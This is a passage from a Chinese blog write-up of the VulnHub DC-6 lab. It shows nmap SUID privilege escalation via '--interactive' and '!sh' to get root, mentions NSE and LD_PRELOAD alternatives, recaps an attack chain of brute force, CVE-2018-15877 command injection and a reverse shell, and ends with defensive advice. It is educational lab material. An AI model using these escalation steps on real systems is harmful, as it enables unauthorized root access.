+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/nmap</span><br></pre></td></tr></table></figure>
+
+<p><strong>nmap 拥有 SUID root 位</strong>，这是 DC-6 最核心的提权线索。</p>
+<h3 id="4-3-nmap-SUID-提权"><a href="#4-3-nmap-SUID-提权" class="headerlink" title="4.3 nmap SUID 提权"></a>4.3 nmap SUID 提权</h3><p>nmap 较老版本支持 <code>--interactive</code> 模式，可在该模式下调用系统 Shell。DC-6 预装的 nmap 正好支持此模式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><code>!</code> 前缀使 nmap 调用系统 shell，因 nmap 以 SUID root 运行，启动的 shell 继承 root 身份。备选方案：利用 NSE 脚本 <code>os.execute(&quot;/bin/bash&quot;)</code> 或 LD_PRELOAD 劫持同样可提权。</p>
+<h3 id="4-4-获取-root"><a href="#4-4-获取-root" class="headerlink" title="4.4 获取 root"></a>4.4 获取 root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span></span><br><span class="line"><span class="comment"># root / uid=0(root)</span></span><br><span class="line"><span class="built_in">cat</span> /root/proof.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>/root/proof.txt</code> 内包含 DC-6 通关标记。</p>
+<h2 id="五、总结与防御建议"><a href="#五、总结与防御建议" class="headerlink" title="五、总结与防御建议"></a>五、总结与防御建议</h2><h3 id="5-1-攻击路径回顾"><a href="#5-1-攻击路径回顾" class="headerlink" title="5.1 攻击路径回顾"></a>5.1 攻击路径回顾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口扫描 → WordPress枚举 → wpscan用户/插件发现</span><br><span class="line">→ 暴力破解获得后台凭证 → Activity Monitor插件CVE-2018-15877命令注入</span><br><span class="line">→ 反弹Shell → nmap SUID提权 → root</span><br></pre></td></tr></table></figure>
+
+<p>攻击链薄弱点：</p>
+<table>
+<thead>
+<tr>
+<th>环节</th>
+<th>弱点</th>
+<th>CVE &#x2F; 技术</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>入口</td>
+<td>弱密码可被暴力破解</td>
+<td>字典攻击</td>
+</tr>
+<tr>
+<td>利用点</td>
+<td>插件未过滤输入，命令注入</td>
+<td>CVE-2018-15877</td>
+</tr>
+<tr>
+<td>本地提权</td>
+<td>nmap 不当设置 SUID 位</td>
+<td>GTFO Bins: nmap</td>
+</tr>
+</tbody></table>
+<h3 id="5-2-防御建议"><a href="#5-2-防御建议" class="headerlink" title="5.2 防御建议"></a>5.2 防御建议</h3><ol>
+<li><strong>密码策略</strong>：实施强密码策略，开启暴力破解登录限制（如 Limit Login Attempts Reloaded 插件）。</li>
+<li><strong>插件管理</strong>：及时更新或移除过时插件（Activity Monitor 已废弃，不应保留）。</li>
+<li><strong>输入过滤</strong>：开发者对所有外部输入使用 <code>escapeshellarg()</code> &#x2F; <code>escapeshellcmd()</code> 严格转义。</li>
+<li><strong>最小权限</strong>：nmap 等工具不应设置 SUID root 位，除非确有必要且已充分评估风险。</li>
+<li><strong>文件完整性监控</strong>：部署 AIDE &#x2F; Tripwire 监控 SUID 位变化等异常属性变更。</li>
+<li><strong>Web 应用防火墙</strong>：WAF 规则拦截 <code>ping</code> 等命令注入特征，阻止恶意请求到达应用层。</li>
+</ol>
+<h3 id="5-3-相关资源"><a href="#5-3-相关资源" class="headerlink" title="5.3 相关资源"></a>5.3 相关资源</h3><ul>
+<li>VulnHub DC-6: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
+<li>CVE-2018-15877: <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-15877">https://nvd.nist.gov/vuln/detail/CVE-2018-15877</a></li>
+<li>GTFO Bins - nmap: <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
+<li>WPScan: <a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></li>
+</ul>
+<hr>
+<p><em>本文完成于 2024 年 9 月，靶机环境稳定可复现。若有疑问欢迎交流。</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" rel="tag"># 框架安全</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/VulnHub-DC5-writeup/" rel="prev" title="VulnHub DC-5靶机实战">
+                  <i class="fa fa-angle-left"></i> VulnHub DC-5靶机实战
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/SQL-injection-error-based/" rel="next" title="SQL 注入：报错注入实战">
+                  SQL 注入：报错注入实战 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
